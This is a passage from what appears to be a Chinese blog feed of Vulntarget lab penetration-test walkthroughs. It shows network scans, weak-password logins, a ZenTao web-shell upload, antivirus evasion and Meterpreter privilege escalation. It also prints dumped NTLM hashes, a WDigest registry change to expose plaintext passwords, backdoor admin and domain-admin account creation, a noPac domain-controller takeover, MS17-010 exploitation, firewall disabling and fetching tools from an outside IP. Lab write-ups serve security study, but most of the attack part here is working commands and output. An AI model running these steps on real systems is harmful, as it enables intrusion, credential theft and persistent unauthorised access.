0</span><br><span class="line">        TX packets 13  bytes 992 (992.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>存在一个内网地址  10.0.20.30 使用fscan扫一下</p><p><img src="../images/image-20231123203905591.png" alt="image-20231123203905591"></p><p>发现扫的时候就扫出来了这个30 就是我们本机自己  于是就猜测是不是内网其他主机开了防火墙</p><p>于是直接扫端口  不ping了  这里的-p 最好是指定固定ip不然会扫的很慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@bogon tmp]# ./fscan_amd64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379</span><br><span class="line">&lt;md64 -h 10.0.20.0/24 -np -p 21,22,80,81,135,139,445,8080,8081,3306,6379     </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">10.0.20.30:22 open</span><br><span class="line">10.0.20.30:80 open</span><br><span class="line">10.0.20.30:21 open</span><br><span class="line">10.0.20.30:81 open</span><br><span class="line">10.0.20.66:8080 open</span><br><span class="line">10.0.20.30:3306 open</span><br><span class="line">10.0.20.66:3306 open</span><br><span class="line">[*] alive ports len is: 7</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://10.0.20.30         code:200 len:1326   title:没有找到站点</span><br><span class="line">[*] WebTitle: http://10.0.20.30:81      code:200 len:14380  title:极致CMS建站系统</span><br><span class="line">[*] WebTitle: http://10.0.20.66:8080    code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://10.0.20.66:8080    [禅道] </span><br></pre></td></tr></table></figure><p>这里的话是扫出来了66这个ip  这个ip只开了8080和3306端口</p><p>使用stowaway挂个代理  进去看看</p><p><img src="../images/image-20231123205036892.png" alt="image-20231123205036892"></p><p>同样是弱口令进行登录  admin/Admin123</p><p><img src="../images/image-20231123205917280.png" alt="image-20231123205917280"></p><p>windows机器</p><p><a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%3C%3D12.4.2%20%E5%90%8E%E5%8F%B0getshell/">禅道漏洞</a></p><p>跟着复现就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip本身是没有的  我们的得自己下来安装</span><br><span class="line"></span><br><span class="line">$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py   # 下载安装脚本</span><br><span class="line">$ sudo python get-pip.py    # 运行安装脚本</span><br></pre></td></tr></table></figure><p>如何就能下载下来pip了  然后使用pip安装pyftpdlib模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -p 24 -d .   //默认开启了匿名</span><br><span class="line"></span><br><span class="line">然后</span><br><span class="line"></span><br><span class="line">ftp://10.0.20.30:24/shell.php</span><br><span class="line"></span><br><span class="line">//这里的用24的原因是21端口已经开了</span><br></pre></td></tr></table></figure><p>然后访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data/client/1/shell.php   就行了</span><br><span class="line"></span><br><span class="line">//这里我不知道为啥写入的是空的  然后就自己手动加进去了</span><br></pre></td></tr></table></figure><p>然后连蚁剑就行了</p><p><img src="../images/image-20231123210412047.png" alt="image-20231123210412047"></p><p>低权限用户  看看能不能提权</p><p><img src="../images/image-20231123210446160.png" alt="image-20231123210446160"></p><p>这个东西开了  可以使用土豆提权  先看看进程  看看有没有杀软</p><p><img src="../images/image-20231123210552153.png" alt="image-20231123210552153"></p><p>存在火绒  不知道土豆传上去会不会被杀  于是先去github上面找个免杀项目上viper后看看</p><p><a href="https://github.com/1y0n/AV_Evasion_Tool">https://github.com/1y0n/AV_Evasion_Tool</a></p><p>先生成c文件  然后丢进去生成exe文件就行了</p><p><img src="../images/image-20231123210918845.png" alt="image-20231123210918845"></p><p>将c文件丢进去就行了   然后上传那个exe文件到机器上运行就行了</p><p><img src="../images/image-20231123211801222.png" alt="image-20231123211801222"></p><p>成功上线  因为是土豆提权  那么找个 msf自带的getsystem也是用土豆提权的  所以尝试一下</p><p><img src="../images/image-20231123211921526.png" alt="image-20231123211921526"></p><p>直接就是system权限  于是导出hash</p><p><img src="../images/image-20231123212016413.png" alt="image-20231123212016413"></p><p><a href="https://blog.csdn.net/shayebudon/article/details/124515853">net 命令大全</a></p><p>这里教一个查域控的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; net time /domain</span><br><span class="line">\\WIN-UH20PRD3EAO.vulntarget.com 的当前时间是 ?2023/?11/?23 21:21:48</span><br><span class="line"></span><br><span class="line">查到域控主机名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; ping WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">正在 Ping WIN-UH20PRD3EAO.vulntarget.com [10.0.10.100] 具有 32 字节的数据:</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">来自 10.0.10.100 的回复: 字节=32 时间&lt;1ms TTL=128</span><br><span class="line">10.0.10.100 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 0ms，最长 = 0ms，平均 = 0ms</span><br><span class="line">    </span><br><span class="line">使用ping命令发现主机地址  (能ping通的前提下)</span><br></pre></td></tr></table></figure><p>使用nslookup域名解析也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt; nslookup WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">������:  UnKnown</span><br><span class="line">Address:  10.0.10.100</span><br><span class="line">����:    WIN-UH20PRD3EAO.vulntarget.com</span><br><span class="line">Address:  10.0.10.100</span><br></pre></td></tr></table></figure><p>获取到system权限后  我们直接导出域内hash就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">meterpreter &gt; hashdump</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:579da618cfbfa85247acf1f800a280a4:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c35945f73d9b85be7064e79706e1baa4:::</span><br><span class="line">win10:1001:aad3b435b51404eeaad3b435b51404ee:6334d634017bb5a1ef02e6e2b158840b:::</span><br><span class="line"></span><br><span class="line">//这个是导出本地管理员的</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">meterpreter &gt; creds_all</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving all credentials</span><br><span class="line">msv credentials</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Username  Domain      NTLM                              SHA1                                      DPAPI</span><br><span class="line">--------  ------      ----                              ----                                      -----</span><br><span class="line">WIN10$    VULNTARGET  44881dfca44eebd45932eb52b045ccc2  2b172d3ceb1c9ce19278c78425287be2c03df0ea</span><br><span class="line">win101    VULNTARGET  282d975e35846022476068ab5a3d72df  bc9ecca8d006d8152bd51db558221a0540c9d604  8d6103509e746ac0ed9641f7c21d7cf7</span><br><span class="line"></span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">Username  Domain      Password</span><br><span class="line">--------  ------      --------</span><br><span class="line">(null)    (null)      (null)</span><br><span class="line">WIN10$    VULNTARGET  (null)</span><br><span class="line">win101    VULNTARGET  (null)</span><br><span class="line"></span><br><span class="line">kerberos credentials</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">Username  Domain          Password</span><br><span class="line">--------  ------          --------</span><br><span class="line">(null)    (null)          (null)</span><br><span class="line">WIN10$    VULNTARGET.COM  (null)</span><br><span class="line">WIN10$    vulntarget.com  d5 b7 6a 61 89 2a 6a 1e 08 d3 78 43 41 8c de 75 55 4c a9 17 cd 00 a8 81 3f 26 fa 82 b0 84 f4 08 55 2f f5 0f 08 e1 72 0d ca 91 98 93 19 ac a3 7b 6a 53 dc f6 b2 15 aa aa 35 c7 d5 86 8d 95 3f 69 04 ce ef 6f b6 8d 72 a8 e5 8c 32 3b 4b 28 81 91 d0 74 9b 69 0b f2 9d ad 1c e4 d9 0d 39 a8 ce 82 77 d0 d6 c6 95 a0 a2 77 34 65 bd 4d a4 5d 29 fe 2a df 77 b1 a2 f4 5b c9 39 fa dd 2f 2a 61 91 d5 87 21 15 36 a0 1f 7d 4c 94 e7 89 33 4b 68 3b b2 fa 38 45 04 76 83 e9 c2 97 fc 14 30 ee 19 ed ba 72 25 5d 87 e9 d4 55 eb 49 66 bb 55 39 9f 6b 0c 8f 44 c9 a7 f4 c1 91 b2 d1 4b 79 2f ac c1 38 fe 2c d0 2e a0 27 0e d1 23 1e 97 16 9e 60 56 86 20 e4 ea 66 aa 65 cd cc f9 db 29 8d d5 7e 42 b1 a6 b9 66 5b ea f6 dc ca b4 a3 e4 6f 35 26 84 26 25</span><br><span class="line">win10$    VULNTARGET.COM  (null)</span><br><span class="line">win101    VULNTARGET.COM  (null)</span><br></pre></td></tr></table></figure><p>win2012以后解决不到处明文的方法</p><p><a href="https://www.anquanke.com/post/id/175364">https://www.anquanke.com/post/id/175364</a></p><p>这个是只能导出域内hash值  password是null  那么通过我们修改注册表的方法是可以进行password显示出来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231123213048096.png" alt="image-20231123213048096"></p><p>如何让这台机器的账户重新进行登录就行了</p><p><img src="../images/image-20231123213237658.png" alt="image-20231123213237658"></p><p>成功的抓取到了密码</p><p>上传那个sharphound进去跑一下分析一下域内环境</p><p><img src="../images/image-20231123214748834.png" alt="image-20231123214748834"></p><p>能成功的rdp上去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">//上面的代码时开启了3389端口</span><br><span class="line"></span><br><span class="line">//下面的代码时新加一个用户到本地管理员组如何rdp上去</span><br><span class="line"></span><br><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain vulntarget.com --ExcludeDCs</span><br></pre></td></tr></table></figure><p>扫一下ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Ethernet adapter Ethernet0:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::8c22:e9be:8a8c:2b3c%12</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.66</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet1:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::14f3:2c89:4bb1:cc63%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.10.99</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br></pre></td></tr></table></figure><p>存在这个10段</p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public&gt;fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br><span class="line">fscan64.exe -h 10.0.10.0/24 -p 1-10000</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.0.10.99      is alive</span><br><span class="line">(icmp) Target 10.0.10.100     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.0.10.100:88 open</span><br><span class="line">10.0.10.100:53 open</span><br><span class="line">10.0.10.100:110 open</span><br><span class="line">10.0.10.99:110 open</span><br><span class="line">10.0.10.99:139 open</span><br><span class="line">10.0.10.100:25 open</span><br><span class="line">10.0.10.99:25 open</span><br><span class="line">10.0.10.100:139 open</span><br><span class="line">10.0.10.100:135 open</span><br><span class="line">10.0.10.99:135 open</span><br><span class="line">10.0.10.100:389 open</span><br><span class="line">10.0.10.100:445 open</span><br><span class="line">10.0.10.99:445 open</span><br><span class="line">10.0.10.100:464 open</span><br><span class="line">10.0.10.100:593 open</span><br><span class="line">10.0.10.100:636 open</span><br><span class="line">10.0.10.100:3268 open</span><br><span class="line">10.0.10.100:3269 open</span><br><span class="line">10.0.10.99:3306 open</span><br><span class="line">10.0.10.99:3389 open</span><br><span class="line">10.0.10.99:5040 open</span><br><span class="line">10.0.10.100:5985 open</span><br><span class="line">10.0.10.99:8080 open</span><br><span class="line">10.0.10.100:9389 open</span><br><span class="line">[*] alive ports len is: 24</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]10.0.10.100</span><br><span class="line">   [-&gt;]WIN-UH20PRD3EAO</span><br><span class="line">   [-&gt;]10.0.10.100</span><br><span class="line">[+] 10.0.10.100 MS17-010        (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 10.0.10.100     [+]DC WIN-UH20PRD3EAO.vulntarget.com      Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://10.0.10.100:5985   code:404 len:315    title:Not Found</span><br><span class="line">[*] WebTitle: http://10.0.10.99:8080    code:200 len:141    title:None</span><br><span class="line">[+] InfoScan:http://10.0.10.99:8080    [禅道] </span><br><span class="line">[+] RDP:10.0.10.99:3389:administrator admin@123</span><br><span class="line">已完成 24/24</span><br><span class="line">[*] 扫描结束,耗时: 2m50.6807079s</span><br></pre></td></tr></table></figure><p>发现域控主机   10.0.10.100</p><p>然后挂二级代理  然后打nopac   明天好好研究一下为啥能打nopac</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py vulntarget.com/win101 -hashes &#x27;:282d975e35846022476068ab5a3d72df&#x27; -dc-ip 10.0.10.100 --impersonate Administrator -create-child -use-ldap -shell</span><br><span class="line"></span><br><span class="line">执行该命令</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231123224306319.png" alt="image-20231123224306319"></p><p>拿下域控</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">添加域管</span><br><span class="line"></span><br><span class="line">net user admin QWEasd@123 /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; admin /add /domain</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目标ip 192.168.52.128&lt;/p&gt;
&lt;p&gt;先使用fscan扫一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/s</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-a</title>
    <link href="https://ke1nys.github.io/posts/55206aca.html"/>
    <id>https://ke1nys.github.io/posts/55206aca.html</id>
    <published>2023-11-13T02:20:11.000Z</published>
    <updated>2023-12-06T02:51:48.637Z</updated>
    
    <content type="html"><![CDATA[<p>192.168.52.132  外网目标ip</p><p>fscan扫一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/vulntarget]</span><br><span class="line">└─# ./fscan_amd64 -h 192.168.52.132 -p 1-10000                                                 </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.52.132  is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">192.168.52.132:110 open</span><br><span class="line">192.168.52.132:80 open</span><br><span class="line">192.168.52.132:135 open</span><br><span class="line">192.168.52.132:139 open</span><br><span class="line">192.168.52.132:445 open</span><br><span class="line">192.168.52.132:1188 open</span><br><span class="line">192.168.52.132:3336 open</span><br><span class="line">192.168.52.132:5357 open</span><br><span class="line">192.168.52.132:8750 open</span><br><span class="line">[*] alive ports len is: 9</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]192.168.52.132</span><br><span class="line">   [-&gt;]win7-PC</span><br><span class="line">   [-&gt;]192.168.52.132</span><br><span class="line">   [-&gt;]10.0.20.128</span><br><span class="line">[*] WebTitle: http://192.168.52.132:8750 code:403 len:564    title:403 Forbidden</span><br><span class="line">[+] 192.168.52.132      MS17-010        (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line">[*] WebTitle: http://192.168.52.132:5357 code:503 len:326    title:Service Unavailable</span><br><span class="line">[*] WebTitle: http://192.168.52.132     code:200 len:10065  title:通达OA网络智能办公系统</span><br><span class="line">[+] InfoScan:http://192.168.52.132     [通达OA] </span><br><span class="line">[+] http://192.168.52.132 tongda-user-session-disclosure </span><br><span class="line">[+] http://192.168.52.132:8750 tongda-user-session-disclosure </span><br><span class="line">已完成 9/9</span><br><span class="line">[*] 扫描结束,耗时: 18.303575184s</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">信息整理一下 </span><br><span class="line">192.168.52.132  通达存在漏洞  MS-17  名字Win7-PC 常规端口 </span><br><span class="line">10.0.20.128  内网地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接打MS17就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search MS17</span><br><span class="line">use 0</span><br><span class="line">set rhosts 192.168.52.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231113103421107.png" alt="image-20231113103421107"></p><p>直接上线  开始信息收集一下 </p><p><img src="../images/image-20231113103608843.png" alt="image-20231113103608843"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">解决乱码</span><br><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off  关闭防火墙命令</span><br><span class="line"></span><br><span class="line">不关闭防火墙的话  MSF和cs的马都上不去</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::55ef:46ff:3f4:a6b3%13</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.0.20.128</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::1c54:a862:b6a5:1f6c%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.52.132</span><br></pre></td></tr></table></figure><p>收集到的信息 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.132  外网地址</span><br><span class="line">10.0.20.128 内网地址</span><br></pre></td></tr></table></figure><p>上传一个fscan扫一下内网  并且上代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget http://101.42.39.110:3389/fscan64.exe</span><br><span class="line"></span><br><span class="line">这里我是用msf的upload模块来上传这个fscan64.exe</span><br><span class="line"></span><br><span class="line">upload fscan64.exe C:\\</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 